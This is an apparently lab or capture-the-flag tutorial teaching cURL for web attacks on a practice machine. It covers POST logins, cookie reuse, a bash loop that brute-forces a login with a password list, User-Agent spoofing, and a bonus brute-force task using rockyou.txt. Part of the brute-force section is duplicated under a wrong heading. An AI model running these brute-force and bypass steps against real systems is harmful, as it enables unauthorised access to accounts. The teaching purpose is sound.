# **Exploitation with cURL – Hoperation Eggsploit**

# **Task 1 – Introduction**

## **The Story**

According to blue-team intel, the **wormhole** is held open by a control panel on the Evil Bunnies' web server. The team must shut it down first to cut off reinforcements before facing **King Malhare**.

However, the terminal they have is bare. **No Burp Suite, no browser, just a command prompt.**

But that's fine. The team will use the command line and **cURL** to speak HTTP directly: send requests, read responses, and find the endpoints that shut the portal.

## **Learning Objectives**

- Understand what HTTP requests and responses are at a high level
- Use cURL to make basic requests (using GET) and view raw responses in the terminal
- Send POST requests with cURL to submit data to endpoints
- Work with cookies and sessions in cURL to maintain login state across requests

---

# **Task 2 – Web Hacking Using cURL**

## **HTTP Requests Using cURL**

Applications, like our browsers, communicate with servers using **HTTP (Hypertext Transfer Protocol)**. Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back.

So if you want to access a website, your browser sends an **HTTP request** to the web server. If the request is valid, the server replies with an **HTTP response** that contains the data needed to display the website.

In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with **cURL**.

**cURL** is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

---

## **Trying out cURL**

Once you have AttackBox ready, open a command prompt and run the command below:

```bash
root@attackbox:~# curl http://MACHINE_IP/
```

What happens after running the command is that `curl` sends an **HTTP GET request** for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal. Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.

---

## **Sending POST Requests**

Suppose you've found a login form whose POST target is `/post.php`. When you log in through a browser, it sends a POST request to the server containing the credentials you entered. We can simulate this directly from the terminal.

A normal login form submission might look like this:

```bash
root@attackbox:~# curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

You should get the reply `Invalid credentials`.

**Here's what's happening:**

- `-X POST` tells cURL to use the POST method
- `-d` defines the data we're sending in the body of the request
- The data will be sent in URL-encoded format, which is the same as what HTML forms use

If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too:

```bash
root@attackbox:~# curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php
```

To view exactly what the server returns (including headers and potential redirects), add the `-i` flag:

```bash
root@attackbox:~# curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

If the site responds with a `Set-Cookie` header, that's a good sign—it means you've successfully logged in or at least triggered a session.

---

## **Using Cookies and Sessions**

Once you log in, web applications use **cookies** to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

You can do this in two steps:

### **Step 1: Save the Cookies**

```bash
root@attackbox:~# curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

- The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case)
- You'll often see a session cookie like `PHPSESSID=xyz123`

### **Step 2: Reuse the Saved Cookies**

```bash
root@attackbox:~# curl -b cookies.txt http://MACHINE_IP/session.php
```

- The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would
- This is exactly how session replay testing works: by replaying valid cookies in separate requests

## **Automating Login and Performing Brute Force Using cURL**

Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

### **Step 1: Create Password List**

Start by creating a file called `passwords.txt` and place the following passwords inside it:

```
admin123
password
letmein
secretpass
secret
```

### **Step 2: Create Brute Force Script**

Then, create a simple bash loop called `loop.sh` to try each password against `bruteforce.php` and copy-paste the following code inside it:

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

### **Step 3: Execute the Script**

Then add the execute permission to the script and run it, as shown below:

```bash
root@attackbox:~# chmod +x loop.sh
root@attackbox:~# ./loop.sh
```

**Here's how this works:**

- `$(cat passwords.txt)` reads each password from the file
- `curl -s` sends the login request silently (no progress meter)
- The response is stored in a variable
- `grep -q` checks if the response contains a success string (like "Welcome")
- When found, it prints the working password and exits the loop

This exact method underpins tools like **Hydra**, **Burp Intruder**, and **WFuzz**. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

## **Bypassing User-Agent Checks**

Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

Start by creating a file called passwords.txt and place the following passwords inside it:

admin123
password
letmein
secretpass
secret
Then, create a simple bash loop called loop.sh to try each password against bruteforce.php and copy-paste the following code inside it:

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
echo "[+] Password found: $pass"
break
fi
done
Then add the execute permission to the script and run it, as shown below:

AttackBox Terminal
root@attackbox:~# chmod +x loop.sh
root@attackbox:~# ./loop.sh
Here's how this works:

$(cat passwords.txt) reads each password from the file.
curl -s sends the login request silently (no progress meter).
The response is stored in a variable.
grep -q checks if the response contains a success string (like “Welcome”).
When found, it prints the working password and exits the loop.
This exact method underpins tools like Hydra, Burp Intruder, and WFuzz. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

## **Bypassing User-Agent Checks**

Some applications block cURL by checking the **User-Agent** header. For example, the server may reject requests with:

```
User-Agent: curl/7.x.x
```

To specify a custom user-agent, we can use the `-A` flag:

```bash
root@attackbox:~# curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

To confirm the check:

```bash
root@attackbox:~# curl -i http://MACHINE_IP/ua_check.php
root@attackbox:~# curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

## **Bonus Mission**

**Note:** This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don't intend to attempt it.

Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

**Hint:** Use `rockyou.txt` when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

**Server:** `http://MACHINE_IP/terminal.php?action=panel`
